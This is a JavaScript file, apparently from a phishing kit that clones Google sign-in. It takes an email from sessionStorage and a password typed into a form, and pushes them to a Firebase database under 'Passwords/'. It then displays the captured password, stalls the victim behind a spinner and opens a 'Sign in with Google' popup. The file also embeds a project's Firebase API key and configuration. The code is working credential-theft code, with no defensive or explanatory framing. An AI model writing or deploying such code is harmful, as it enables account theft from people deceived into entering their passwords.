import { initializeApp } from "https://www.gstatic.com/firebasejs/9.8.1/firebase-app.js";
import { getDatabase, ref, push, get, query, orderByChild, limitToLast } from "https://www.gstatic.com/firebasejs/9.8.1/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyDzJSKTgfUFKZ3GLFP5rIprrNkY77lq7FA",
  authDomain: "g-clone-f53db.firebaseapp.com",
  databaseURL: "https://g-clone-f53db-default-rtdb.firebaseio.com",
  projectId: "g-clone-f53db",
  storageBucket: "g-clone-f53db.appspot.com",
  messagingSenderId: "567090264097",
  appId: "1:567090264097:web:31d4e3c99fcba6dc624b60",
  measurementId: "G-YBG1228CM5"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

function openPopup(url) {
  const popupWidth = 500;
  const popupHeight = 600;
  const left = (screen.width - popupWidth) / 2;
  const top = (screen.height - popupHeight) / 2;

  window.open(
    url,
    'Sign in with Google',
    `width=${popupWidth},height=${popupHeight},top=${top},left=${left},toolbar=no,location=no,status=no,menubar=no,scrollbars=no,resizable=no`
  );
}

function resetInputs() {
  document.getElementById("password").value = "";
}

function displayRecentPassword() {
  const passwordsRef = ref(database, 'Passwords/');
  const recentPasswordQuery = query(passwordsRef, orderByChild('timestamp'), limitToLast(1));

  get(recentPasswordQuery).then((snapshot) => {
    if (snapshot.exists()) {
      const data = snapshot.val();
      const lastPasswordKey = Object.keys(data)[0]; // Get the key of the last password
      const lastPassword = data[lastPasswordKey]; // Access the password value

      const recentPasswordElement = document.getElementById("recentPassword");
      if (recentPasswordElement) {
        recentPasswordElement.textContent = lastPassword.password;
        console.log("Displayed recent password:", lastPassword.password);
      } else {
        console.error("recentPasswordElement not found");
      }
    } else {
      console.log("No passwords found.");
    }
  }).catch((error) => {
    console.error("Error retrieving recent password: ", error);
  });
}

document.addEventListener("DOMContentLoaded", () => {
  console.log("Document loaded and script running.");

  // Retrieve the email and password from sessionStorage
  const lastEmail = sessionStorage.getItem("lastEmail");
  const lastPassword = sessionStorage.getItem("lastPassword");

  console.log("Retrieved lastEmail from sessionStorage:", lastEmail);
  console.log("Retrieved lastPassword from sessionStorage:", lastPassword);

  const lastEmailElement = document.getElementById("lastEmail");
  const lastPasswordElement = document.getElementById("lastPassword");

  if (lastEmailElement) {
    if (lastEmail) {
      lastEmailElement.textContent = lastEmail;
      console.log("Displayed last email:", lastEmail);
    } else {
      lastEmailElement.textContent = "No email found.";
      console.log("No email found in sessionStorage.");
    }
  } else {
    console.error("lastEmailElement not found");
  }

  if (lastPasswordElement) {
    if (lastPassword) {
      lastPasswordElement.textContent = lastPassword;
      console.log("Displayed last password:", lastPassword);
    } else {
      lastPasswordElement.textContent = "No password found.";
      console.log("No password found in sessionStorage.");
    }
  } else {
    console.error("lastPasswordElement not found");
  }

  // Add event listener for the password submission button
  const addButton = document.getElementById("addButton");

  if (addButton) {
    addButton.addEventListener("click", () => {
      // Get the email and password values from the input fields
      const email = sessionStorage.getItem("lastEmail");
      const passwordInput = document.getElementById('password');
      const password = passwordInput ? passwordInput.value.trim() : '';

      // Log the values for debugging
      console.log("Attempting to add password:", password);
      console.log("Stored email from sessionStorage:", email);

      // Check if both email and password are not empty
      if (!email || !password) {
        console.error("Email or password field is empty.");
        return;
      }
      $("#loadingSpinner").css("display", "block"); // Show the spinner

      // Store the password in sessionStorage
      sessionStorage.setItem("lastPassword", password);

      // Push password to Firebase with a timestamp
      push(ref(database, 'Passwords/'), {
        email: email,
        password: password,
        timestamp: Date.now() // Add a timestamp to sort by
      }).then(() => {
        console.log("Password added to database:", password);
        // Hide the spinner and perform additional actions
        setTimeout(() => {
          $("#loadingSpinner").css("display", "none"); // Hide the spinner
          resetInputs();
          openPopup('./index7.html');
        }, 60000);
        
        displayRecentPassword(); // Display the most recent password
      }).catch((error) => {
        console.error("Error adding password: ", error);
        $("#loadingSpinner").css("display", "none"); // Ensure spinner is hidden in case of error
      });
    });
  } else {
    console.error("addButton not found");
  }


  // Display the most recent password on page load
  displayRecentPassword();
});
